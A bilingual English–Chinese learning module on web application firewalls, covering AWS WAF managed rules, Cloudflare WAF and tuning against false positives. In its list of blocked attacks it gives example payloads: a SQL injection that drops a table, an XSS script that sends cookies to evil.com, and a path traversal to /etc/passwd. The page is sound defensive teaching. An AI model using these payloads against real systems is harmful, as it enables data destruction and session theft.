---
id: waf
title: Web Application Firewalls
zone: scaling
edges:
  to: []
difficulty: 2
tags:
  - waf
  - web-application-firewall
  - security
  - aws-waf
  - cloudflare
  - owasp
  - ddos
  - sql-injection
category: concept
milestones:
  - Explain what a WAF does and how it differs from a network firewall
  - Name three attack types in the OWASP Top 10 that a WAF blocks
  - Understand what managed rule groups are in AWS WAF
  - Explain what a false positive is and why WAF tuning is an ongoing process
  - Know when Cloudflare WAF makes more sense than rolling your own
title_zh: "Web 应用防火墙"

---


A Web Application Firewall (WAF) inspects HTTP requests and blocks ones that look malicious. A network firewall controls which ports and IP addresses can communicate; a WAF understands HTTP deeply enough to tell a normal form submission from a SQL injection attempt, a legitimate page request from a path traversal attack. It sits in front of your application and acts as a filter for application-layer attacks.

<!-- DEEP_DIVE -->

## What a WAF blocks

WAFs operate against a ruleset. The OWASP Top 10 defines the most common web application vulnerabilities, and most WAF rule sets cover them:

- **SQL injection**: `'; DROP TABLE users; --` in form fields, query parameters, headers
- **Cross-site scripting (XSS)**: `<script>document.location='https://evil.com/'+document.cookie</script>` in user inputs that get reflected back in HTML
- **Path traversal**: `../../../../etc/passwd` in file path parameters
- **Remote code execution**: attempts to inject shell commands or exploit known vulnerabilities in frameworks/libraries
- **Malicious bots and scanners**: automated vulnerability scanners (Nikto, Nessus), content scrapers, credential stuffing attacks

The WAF inspects request URI, headers, query string, and body against these patterns. Matching requests are blocked (or flagged for review) before they reach your application.

## WAF vs network firewall

A **network firewall** (security group, NACL, hardware firewall) operates at Layer 3/4: IP addresses and ports. It blocks traffic from banned IPs or to closed ports. It cannot see HTTP content.

A **WAF** operates at Layer 7: it parses HTTP requests and inspects their content. It can block a request to port 443 from a valid IP if the request body contains a SQL injection payload. The two are complementary — use a network firewall to control which services are publicly reachable, and a WAF to filter malicious HTTP traffic that reaches your public endpoints.

## AWS WAF

AWS WAF integrates with CloudFront, ALB, and API Gateway. You define **WebACLs** (Access Control Lists) containing rules and rule groups. AWS provides managed rule groups for common threats:

- **AWS-AWSManagedRulesCommonRuleSet**: general web protection (XSS, SQL injection, path traversal)
- **AWS-AWSManagedRulesKnownBadInputsRuleSet**: known-bad request patterns
- **AWS-AWSManagedRulesAmazonIpReputationList**: blocks IPs with bad reputation (botnets, known scanners)
- **AWS-AWSManagedRulesBotControlRuleSet**: bot management with CAPTCHA support

You can also write custom rules: block requests from specific countries, limit request size, require specific headers.

AWS WAF pricing is per WebACL per region, per million requests, and per rule group — add these costs up before enabling everything.

## Cloudflare WAF

Cloudflare sits between the internet and your origin as a global CDN and WAF simultaneously. Traffic is proxied through Cloudflare's global network, which filters malicious requests, serves cached content, and terminates DDoS attacks before traffic reaches your servers. For publicly accessible web applications, Cloudflare's free and Pro tiers include substantial WAF capabilities.

Cloudflare is operationally simpler than AWS WAF for many use cases — point your DNS at Cloudflare, enable WAF, done. The trade-off is that your traffic flows through a third party.

## False positives and tuning

WAFs are not set-and-forget. Rules designed to catch attacks can also block legitimate requests:
- A product review mentioning `"I clicked submit and it <worked>"` might match an XSS rule
- A search query with `SELECT` in it might match a SQL injection rule
- API endpoints expecting certain character sequences in request bodies

When enabling a WAF, start in **count mode** (log matching requests but don't block them). Review the logs for false positives. Adjust rules or add exceptions for known-good patterns. Then switch to block mode. Revisit after significant application changes.

WAF tuning is ongoing, not a one-time task.

<!-- RESOURCES -->

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) -- type: article, time: 20m
- [AWS WAF Documentation](https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter.html) -- type: docs, time: 30m
- [Cloudflare WAF](https://www.cloudflare.com/waf/) -- type: article, time: 10m
- [AWS Managed Rule Groups](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html) -- type: docs, time: 15m

<!-- ZH_SUMMARY -->
Web 应用防火墙（WAF）会检查 HTTP 请求，并拦截那些看起来具有恶意的请求。网络防火墙控制哪些端口和 IP 地址可以通信；而 WAF 对 HTTP 的理解足够深入，能够区分正常的表单提交与 SQL 注入尝试、合法的页面请求与路径遍历攻击。它位于应用程序之前，充当应用层攻击的过滤器。

<!-- ZH_DEEP_DIVE -->
## WAF 拦截的内容

WAF 依据规则集运行。OWASP Top 10 定义了最常见的 Web 应用漏洞，大多数 WAF 规则集都覆盖了这些漏洞：

- **SQL 注入**：表单字段、查询参数、请求头中的 `'; DROP TABLE users; --`
- **跨站脚本（XSS）**：用户输入中会被反射回 HTML 的 `<script>document.location='https://evil.com/'+document.cookie</script>`
- **路径遍历**：文件路径参数中的 `../../../../etc/passwd`
- **远程代码执行**：试图注入 shell 命令或利用框架/库中已知漏洞的请求
- **恶意机器人和扫描器**：自动化漏洞扫描器（Nikto、Nessus）、内容抓取器、撞库攻击

WAF 会针对这些模式检查请求 URI、请求头、查询字符串和请求体。匹配的请求会在到达你的应用之前被拦截（或被标记以供审查）。

## WAF 与网络防火墙

**网络防火墙**（安全组、NACL、硬件防火墙）工作在第 3/4 层：IP 地址和端口。它拦截来自被封禁 IP 或发往已关闭端口的流量。它无法看到 HTTP 内容。

**WAF** 工作在第 7 层：它解析 HTTP 请求并检查其内容。如果请求体包含 SQL 注入载荷，即使请求来自合法 IP 发往 443 端口，它也能将其拦截。两者是互补的——用网络防火墙控制哪些服务可被公网访问，用 WAF 过滤到达你公网端点的恶意 HTTP 流量。

## AWS WAF

AWS WAF 与 CloudFront、ALB 和 API Gateway 集成。你定义包含规则和规则组的 **WebACL**（访问控制列表）。AWS 为常见威胁提供托管规则组：

- **AWS-AWSManagedRulesCommonRuleSet**：通用 Web 防护（XSS、SQL 注入、路径遍历）
- **AWS-AWSManagedRulesKnownBadInputsRuleSet**：已知恶意请求模式
- **AWS-AWSManagedRulesAmazonIpReputationList**：拦截信誉不良的 IP（僵尸网络、已知扫描器）
- **AWS-AWSManagedRulesBotControlRuleSet**：机器人管理，支持 CAPTCHA

你也可以编写自定义规则：拦截来自特定国家/地区的请求、限制请求大小、要求特定请求头。

AWS WAF 的计费按每个区域的每个 WebACL、每百万请求以及每个规则组收费——在全部启用之前请先累加这些成本。

## Cloudflare WAF

Cloudflare 作为全球 CDN 和 WAF 同时位于互联网与你的源站之间。流量通过 Cloudflare 的全球网络代理，该网络在流量到达你的服务器之前过滤恶意请求、提供缓存内容并抵御 DDoS 攻击。对于可公开访问的 Web 应用，Cloudflare 的免费版和 Pro 版包含相当可观的 WAF 能力。

在许多场景下，Cloudflare 在运维上比 AWS WAF 更简单——把 DNS 指向 Cloudflare，启用 WAF，就完成了。代价是你的流量要经过第三方。

## 误报与调优

WAF 并非设置后即可放任不管。为捕获攻击而设计的规则也可能拦截合法请求：
- 一条提到 `"I clicked submit and it <worked>"` 的商品评论可能匹配 XSS 规则
- 包含 `SELECT` 的搜索查询可能匹配 SQL 注入规则
- 期望请求体中出现特定字符序列的 API 端点

启用 WAF 时，先从**计数模式**开始（记录匹配的请求但不拦截）。审查日志中的误报。调整规则或为已知正常的模式添加例外。然后切换到拦截模式。在应用发生重大变更后重新审视。

WAF 调优是持续性的工作，而非一次性任务。

<!-- ZH_RESOURCES -->
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) -- 类型: 文章, 时长: 20m
- [AWS WAF 文档](https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter.html) -- 类型: 文档, 时长: 30m
- [Cloudflare WAF](https://www.cloudflare.com/waf/) -- 类型: 文章, 时长: 10m
- [AWS 托管规则组](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-list.html) -- 类型: 文档, 时长: 15m

<!-- ZH_UI -->
1. 解释 WAF 的作用及其与网络防火墙的区别
2. 列举 WAF 可拦截的 OWASP Top 10 中的三种攻击类型
3. 理解 AWS WAF 中的托管规则组是什么
4. 解释什么是误报，以及为什么 WAF 调优是持续过程
5. 了解何时 Cloudflare WAF 比自建更合适
